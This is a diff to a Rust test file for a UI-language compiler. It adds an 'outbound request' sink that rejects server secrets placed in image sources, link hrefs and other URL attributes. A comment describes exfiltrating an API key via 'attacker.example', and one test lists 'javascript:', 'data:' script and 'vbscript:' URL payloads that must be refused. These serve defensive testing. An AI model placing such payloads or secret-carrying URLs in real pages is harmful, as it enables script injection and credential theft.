@@ -663,7 +663,7 @@ view
 // Structure.
 // ---------------------------------------------------------------------
 
-/// §14G.1.3(c): the sink list is declared and closed at six.
+/// §14G.1.3(c): the sink list is declared and closed at seven.
 ///
 /// This asserted `Sink::CLOSED_LIST.len() == 6` on a `[Sink; 6]`, which
 /// the compiler folds to `6 == 6`. It could not fail, and it was not
@@ -673,7 +673,8 @@ view
 /// The match below is exhaustive and this workspace forbids wildcard arms
 /// over `Sink`, so a new variant is a compile error until someone writes
 /// it down — and the round trip through `CLOSED_LIST` then fails unless
-/// they add it to the list too.
+/// they add it to the list too. `OutboundRequest` is the seventh, and it
+/// arrived by exactly that route.
 #[test]
 fn the_sink_list_is_closed() {
     fn name(sink: Sink) -> &'static str {
@@ -684,6 +685,7 @@ fn the_sink_list_is_closed() {
             Sink::ResponseBody => "ResponseBody",
             Sink::PlatformLog => "PlatformLog",
             Sink::LiveSync => "LiveSync",
+            Sink::OutboundRequest => "OutboundRequest",
         }
     }
 
@@ -692,6 +694,7 @@ fn the_sink_list_is_closed() {
         "BuildArtifact",
         "ClientState",
         "LiveSync",
+        "OutboundRequest",
         "PlatformLog",
         "ResponseBody",
         "View",
@@ -700,7 +703,7 @@ fn the_sink_list_is_closed() {
     listed.sort_unstable();
     listed.dedup();
 
-    assert_eq!(listed, declared, "the closed list is not the six sinks");
+    assert_eq!(listed, declared, "the closed list is not the seven sinks");
 }
 
 /// **Exactly one** placement reaches the build artefact, and it is
@@ -1066,5 +1069,233 @@ view
         codes(&split.diagnostics).contains(&"E0301"),
         "a `static` signal reading a `server` secret must be refused by E0301: {:?}",
         codes(&split.diagnostics)
+    );
+}
+
+// ---------------------------------------------------------------------
+// §14G.1.3(c) sink 7 — the outbound request.
+// ---------------------------------------------------------------------
+
+/// A program with one secret and one view, parameterised on the element
+/// line under test. Everything else is `guestbook.zd`'s shape: a `server`
+/// signal reading the environment, which is the only way to hold a secret.
+fn with_view(line: &str) -> String {
+    format!(
+        "secret state apiKey is server Text from environment \"API_KEY\"\n\
+         state shown is client Text starting \"/assets/desk.png\"\n\
+         view\n    Column\n{line}\n"
+    )
+}
+
+/// The hole, closed. `Image source is apiKey` renders no visible text and
+/// reaches no response body — and the browser sends
+/// `GET https://attacker.example/<apiKey>` before anything is painted.
+///
+/// The assertion is on the **code**, not on "compilation failed". Before
+/// this rule the program was refused only because code generation refuses
+/// every `secret` outright, which is a blunt instrument in the wrong pass:
+/// it stops being sufficient the moment a `secret` is legitimately usable
+/// on the server, which `guestbook.zd` already requires.
+#[test]
+fn an_image_source_that_is_a_secret_is_rejected_by_the_flow_pass() {
+    let src = with_view("        Image source is apiKey, alt is \"a\"");
+    let (_, _, verdict) = verdict(&src);
+
+    let error = verdict
+        .errors()
+        .find(|e| e.code == "E-IFC-11")
+        .unwrap_or_else(|| {
+            panic!(
+                "expected the outbound-request sink to reject it; got {:?}",
+                verdict
+                    .diagnostics
+                    .iter()
+                    .map(|d| d.rendered_message())
+                    .collect::<Vec<_>>()
+            )
+        });
+
+    assert!(error.message.contains("source"), "{}", error.message);
+    assert!(
+        error.message.contains("a request the browser sends"),
+        "{}",
+        error.message
+    );
+
+    // §7.3: both spans — the declaration, and the escape.
+    let path: Vec<&str> = error.notes.iter().map(|(_, note)| note.as_str()).collect();
+    assert!(
+        path.iter().any(|note| note.contains("declared secret")),
+        "the path must start at the declaration: {path:?}"
+    );
+    assert!(
+        path.iter().any(|note| note.contains("outbound request")),
+        "the path must name the escape: {path:?}"
+    );
+    assert!(
+        error.notes.iter().any(|(span, _)| *span != error.span),
+        "the path must name a second span, not only the escape's own"
+    );
+}
+
+/// The same rule for the other element that carries one today.
+#[test]
+fn a_link_href_that_is_a_secret_is_rejected_by_the_flow_pass() {
+    let src = with_view("        Link href is apiKey\n            Text \"here\"");
+    assert!(
+        ifc_codes(&src).contains(&"E-IFC-11"),
+        "{:?}",
+        ifc_codes(&src)
+    );
+}
+
+/// **Every** URL-bearing attribute, enumerated from the rule rather than
+/// from a list written out here.
+///
+/// The enforcement ranges over the attribute *name* on every element,
+/// because an unrecognised named argument reaches the DOM as the attribute
+/// of that name — so `Text src is apiKey` is a leak on an element whose
+/// signature has no `src` at all. A rule keyed on the element would let
+/// every one of these through.
+#[test]
+fn every_url_bearing_attribute_is_a_sink() {
+    // Counted, because the assertion is inside the loop: an emptied
+    // `URL_ATTRIBUTES` would remove the rule and pass this test.
+    assert_eq!(
+        zdc_hir::URL_ATTRIBUTES.len(),
+        18,
+        "the URL attribute list changed size"
+    );
+    let mut scanned = 0;
+    for attribute in zdc_hir::URL_ATTRIBUTES {
+        let src = with_view(&format!("        Text \"a\", {attribute} is apiKey"));
+        let codes = ifc_codes(&src);
+        scanned += 1;
+        assert!(
+            codes.contains(&"E-IFC-11"),
+            "`{attribute}` is in URL_ATTRIBUTES but is not a sink: {codes:?}"
+        );
+    }
+    assert_eq!(scanned, zdc_hir::URL_ATTRIBUTES.len());
+}
+
+/// **The ruling on non-URL attributes.** They are sinks, and they were
+/// already: the view sink is the DOM, not the visible text. `id`, `class`
+/// and `alt` are in the serialised document, in view-source, in the
+/// devtools inspector, and readable by any script on the page — so a
+/// secret in one has left the server exactly as a rendered one has.
+///
+/// It is E-IFC-05 rather than E-IFC-11 on purpose. The two name different
+/// escapes: a non-URL attribute discloses the value to whoever reads the
+/// page, and a URL-bearing one *transmits* it to a host the value itself
+/// chooses, which is a leak even in a document nobody ever looks at.
+#[test]
+fn a_secret_in_a_plain_attribute_is_still_the_view_sink() {
+    for attribute in ["id", "class", "alt", "title"] {
+        let src = with_view(&format!("        Text \"a\", {attribute} is apiKey"));
+        let codes = ifc_codes(&src);
+        assert!(
+            codes.contains(&"E-IFC-05"),
+            "`{attribute}` must still be refused: {codes:?}"
+        );
+        assert!(
+            !codes.contains(&"E-IFC-11"),
+            "`{attribute}` is not a request the browser sends: {codes:?}"
+        );
+    }
+}
+
+/// A `javascript:` URL is refused at **compile time**, by the pass that
+/// owns URL positions, and not sanitised into silence.
+#[test]
+fn an_executing_url_literal_is_a_compile_error() {
+    for url in [
+        "javascript:alert(1)",
+        "JavaScript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox(1)",
+    ] {
+        let src = with_view(&format!(
+            "        Link href is \"{url}\"\n            Text \"go\""
+        ));
+        let (_, _, verdict) = verdict(&src);
+        let error = verdict
+            .errors()
+            .find(|e| e.code == "E-URL-01")
+            .unwrap_or_else(|| panic!("`{url}` was not refused"));
+        assert!(
+            error.message.contains("executes rather than fetches"),
+            "{}",
+            error.message
+        );
+    }
+}
+
+/// The repaired twin, per §17.3.9 item 3: the pass must not pass by
+/// rejecting every URL. This is `page.zd`'s shape — a relative link, an
+/// absolute one, an image, and a URL built from data by `each` — and it
+/// must be accepted whole.
+#[test]
+fn a_page_of_real_links_still_compiles() {
+    let src = "\
+record Note
+    slug  is Text
+    title is Text
+
+state notes is client List of Note starting [(Note with slug is \"/notes/signals\", title is \"Signals\")]
+
+view
+    Column
+        Link href is \"/\"
+            Text \"home\"
+        Link href is \"https://example.com/feed.xml\"
+            Text \"feed\"
+        Link href is \"mailto:someone@example.com\"
+            Text \"write\"
+        Image source is \"/assets/desk.png\", alt is \"A desk\"
+        each note in notes
+            Link href is note.slug
+                Text note.title
+";
+    let (_, split, verdict) = verdict(src);
+    assert!(
+        !split.has_errors(),
+        "the split rejected it: {:?}",
+        split
+            .errors()
+            .map(|e| e.rendered_message())
+            .collect::<Vec<_>>()
+    );
+    assert!(
+        !verdict.has_errors(),
+        "a page of ordinary links must compile: {:?}",
+        verdict
+            .errors()
+            .map(|e| e.rendered_message())
+            .collect::<Vec<_>>()
+    );
+}
+
+/// A public value in a URL is not a leak, on the element that carries one.
+#[test]
+fn a_public_url_is_not_an_outbound_leak() {
+    let src = with_view("        Image source is shown, alt is \"a\"");
+    let codes = ifc_codes(&src);
+    assert!(codes.is_empty(), "{codes:?}");
+}
+
+/// The soundness bug the obligation key fixed, in the new sink's own
+/// terms: two URL arguments sharing nothing but a span must not discharge
+/// each other. `SinkSite::UrlArgument` carries the expression, so they
+/// cannot.
+#[test]
+fn two_url_arguments_are_two_obligations() {
+    let src = with_view(
+        "        Image source is shown, alt is \"a\"\n        Image source is apiKey, alt is \"b\"",
+    );
+    let codes = ifc_codes(&src);
+    assert!(
+        codes.contains(&"E-IFC-11"),
+        "the public one must not discharge the secret one: {codes:?}"
     );
 }
